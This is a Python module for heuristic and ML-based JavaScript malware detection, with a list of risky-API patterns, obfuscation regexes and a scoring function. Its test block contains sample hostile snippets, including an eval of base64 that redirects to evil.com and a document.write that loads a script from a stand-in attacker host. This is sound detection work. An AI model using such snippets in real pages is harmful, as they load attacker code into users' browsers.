"""
JavaScript ML Model Predictor
Provides machine learning-based JavaScript malware detection

This module should be trained using: python ml_js_model/training/train_js_model.py
Currently provides a baseline predictor until trained model is available.
"""

import pickle
import os
import re
import logging
from typing import Dict, List

logger = logging.getLogger(__name__)

# Model storage path
MODEL_PATH = os.path.join(os.path.dirname(__file__), 'js_model.pkl')
VECTORIZER_PATH = os.path.join(os.path.dirname(__file__), 'js_vectorizer.pkl')


class JavaScriptMLPredictor:
    """JavaScript threat predictor using machine learning"""
    
    # Known malicious JavaScript patterns
    MALICIOUS_PATTERNS = {
        'eval': 'High-risk eval() execution',
        'document.write': 'DOM manipulation risk',
        'innerHTML': 'XSS injection risk',
        'XMLHttpRequest': 'Potential data exfiltration',
        'fetch': 'Potential data exfiltration',
        'crypto.subtle': 'Cryptocurrency mining detection',
        'WebWorker': 'Background malware execution',
        'Function\\(': 'Dynamic function creation',
        'setTimeout': 'Delayed malicious execution',
        'setInterval': 'Continuous malicious activity',
        'document.location': 'Redirect risk',
        'window.location': 'Redirect risk',
        'onclick': 'User interaction hijacking',
        'onload': 'Auto-execution risk',
        'obfuscate': 'Code obfuscation detected',
        'atob': 'Base64 decoding (often obfuscated)',
        'btoa': 'Base64 encoding (data exfiltration)',
    }
    
    # Obfuscation indicators
    OBFUSCATION_INDICATORS = [
        r'\\x[0-9a-f]{2}',  # Hex encoding
        r'\\u[0-9a-f]{4}',  # Unicode encoding
        r'String\.fromCharCode',  # Character construction
        r'\w+\(\w+,\w+,\w+,\w+\)',  # Minified code pattern
        r'[a-zA-Z]=[a-zA-Z]\+[a-zA-Z]',  # Variable concatenation
    ]
    
    def __init__(self):
        """Initialize JS predictor"""
        self.model = None
        self.vectorizer = None
        self.model_loaded = False
        self._load_model()
    
    def _load_model(self):
        """Load trained model from disk if available"""
        try:
            if os.path.exists(MODEL_PATH) and os.path.exists(VECTORIZER_PATH):
                with open(MODEL_PATH, 'rb') as f:
                    self.model = pickle.load(f)
                with open(VECTORIZER_PATH, 'rb') as f:
                    self.vectorizer = pickle.load(f)
                self.model_loaded = True
                logger.info("✅ Trained JavaScript model loaded")
            else:
                logger.warning("⚠️ No trained JavaScript model found - using baseline predictor")
                self.model_loaded = False
        except Exception as e:
            logger.warning(f"⚠️ Failed to load JavaScript model: {e}")
            self.model_loaded = False
    
    def _extract_js_features(self, js_code: str) -> Dict:
        """
        Extract features from JavaScript code
        
        Features analyzed:
        - Code length
        - Malicious function calls
        - DOM manipulation
        - Obfuscation indicators
        - Network calls (XMLHttpRequest, fetch)
        - Eval usage
        - Minification level
        """
        try:
            features = {
                'code_length': len(js_code),
                'line_count': len(js_code.split('\n')),
                'malicious_patterns': 0,
                'malicious_apis': 0,
                'obfuscation_score': 0,
                'network_calls': 0,
                'eval_usage': 0,
                'dom_manipulation': 0,
                'unique_patterns': [],
            }
            
            # Normalize code for analysis
            js_lower = js_code.lower()
            
            # Check for malicious patterns
            for pattern, description in self.MALICIOUS_PATTERNS.items():
                if pattern.lower() in js_lower:
                    features['malicious_patterns'] += 1
                    features['unique_patterns'].append(description)
                    
                    # Categorize by type
                    if pattern in ['XMLHttpRequest', 'fetch']:
                        features['network_calls'] += 1
                    elif pattern in ['eval', 'Function']:
                        features['eval_usage'] += 1
                    elif pattern in ['innerHTML', 'document.write', 'appendChild']:
                        features['dom_manipulation'] += 1
            
            # Check for obfuscation
            obfuscation_count = 0
            for indicator in self.OBFUSCATION_INDICATORS:
                if re.search(indicator, js_code):
                    obfuscation_count += 1
            features['obfuscation_score'] = min(obfuscation_count * 20, 100)
            
            # Check code minification (low spaces/high special chars ratio)
            space_ratio = js_code.count(' ') / len(js_code) if js_code else 0
            if space_ratio < 0.1:  # Less than 10% spaces = likely minified
                features['obfuscation_score'] += 10
            
            return features
        
        except Exception as e:
            logger.warning(f"Feature extraction error: {e}")
            return {}
    
    def predict(self, js_code: str) -> dict:
        """
        Predict JavaScript threat level
        
        Args:
            js_code: JavaScript code to analyze
            
        Returns:
            dict: {
                'confidence': float (0-1),
                'risk_score': float (0-100),
                'threat_level': str ('benign', 'suspicious', 'malicious'),
                'features': dict,
                'detected_patterns': list
            }
        """
        try:
            # Extract features
            features = self._extract_js_features(js_code)
            
            # If trained model is available, use it
            if self.model_loaded and self.model and self.vectorizer:
                try:
                    # Vectorize code
                    code_vector = self.vectorizer.transform([js_code])
                    
                    # Get prediction
                    prediction = self.model.predict(code_vector)[0]
                    proba = self.model.predict_proba(code_vector)[0]
                    
                    # Map to confidence and risk
                    confidence = max(proba)
                    risk_score = int(proba[1] * 100) if len(proba) > 1 else 0
                    
                except Exception as e:
                    logger.warning(f"Model prediction error: {e} - using baseline")
                    risk_score = self._baseline_predict(features)
                    confidence = 0.7
            else:
                # Use baseline heuristic predictor
                risk_score = self._baseline_predict(features)
                confidence = 0.5
            
            # Determine threat level
            if risk_score >= 70:
                threat_level = 'malicious'
            elif risk_score >= 40:
                threat_level = 'suspicious'
            else:
                threat_level = 'benign'
            
            return {
                'confidence': confidence,
                'risk_score': risk_score,
                'threat_level': threat_level,
                'features': features,
                'detected_patterns': features.get('unique_patterns', []),
                'model_status': 'trained' if self.model_loaded else 'baseline'
            }
        
        except Exception as e:
            logger.error(f"Prediction error: {e}")
            return {
                'confidence': 0.0,
                'risk_score': 0,
                'threat_level': 'unknown',
                'features': {},
                'detected_patterns': [],
                'error': str(e)
            }
    
    def _baseline_predict(self, features: dict) -> int:
        """
        Baseline heuristic predictor when ML model unavailable
        
        Returns risk score 0-100 based on code features
        """
        risk_score = 0
        
        # Malicious patterns are high-risk
        malicious_count = features.get('malicious_patterns', 0)
        if malicious_count > 0:
            risk_score += min(malicious_count * 20, 60)
        
        # Eval usage is very dangerous
        if features.get('eval_usage', 0) > 0:
            risk_score += 40
        
        # DOM manipulation without context is suspicious
        if features.get('dom_manipulation', 0) > 0:
            risk_score += 20
        
        # Network calls are suspicious (data exfiltration)
        if features.get('network_calls', 0) > 0:
            risk_score += 25
        
        # Obfuscation is strong indicator
        obfuscation = features.get('obfuscation_score', 0)
        if obfuscation > 30:
            risk_score += 30
        
        # Very long code is suspicious
        code_length = features.get('code_length', 0)
        if code_length > 50000:
            risk_score += 15
        
        # Minified code with malicious patterns
        if obfuscation > 50 and malicious_count > 0:
            risk_score += 20
        
        return min(risk_score, 100)  # Cap at 100


# Global predictor instance
_js_predictor = JavaScriptMLPredictor()


def predict_js(js_code: str) -> dict:
    """
    Predict JavaScript threat level
    
    Usage:
        from js_model_predict import predict_js
        result = predict_js('eval(atob("..."))')
        print(result['risk_score'])  # 0-100
        print(result['threat_level'])  # 'benign', 'suspicious', 'malicious'
    
    Args:
        js_code: JavaScript code to analyze
        
    Returns:
        dict: Prediction result with risk_score, threat_level, confidence, detected_patterns
    """
    return _js_predictor.predict(js_code)


if __name__ == '__main__':
    # Test the predictor
    test_codes = [
        'console.log("Hello World");',
        'eval(atob("ZG9jdW1lbnQubG9jYXRpb249aHR0cDovL2V2aWwuY29t"));',
        'var x = String.fromCharCode(102, 105, 108, 101); XMLHttpRequest.open("GET", x);',
        'setInterval(function() { new WebWorker("miner.js"); }, 1000);',
        'document.write("<script src=\'http://evil.com/malware.js\'></script>");',
    ]
    
    predictor = JavaScriptMLPredictor()
    
    print("\n🧪 JavaScript Prediction Test")
    print("=" * 70)
    
    for code in test_codes:
        result = predictor.predict(code)
        print(f"\nCode: {code[:60]}{'...' if len(code) > 60 else ''}")
        print(f"  Risk Score: {result['risk_score']}/100")
        print(f"  Threat Level: {result['threat_level']}")
        print(f"  Confidence: {result['confidence']:.2f}")
        print(f"  Detected Patterns: {len(result['detected_patterns'])} found")
        print(f"  Model Status: {result.get('model_status', 'unknown')}")
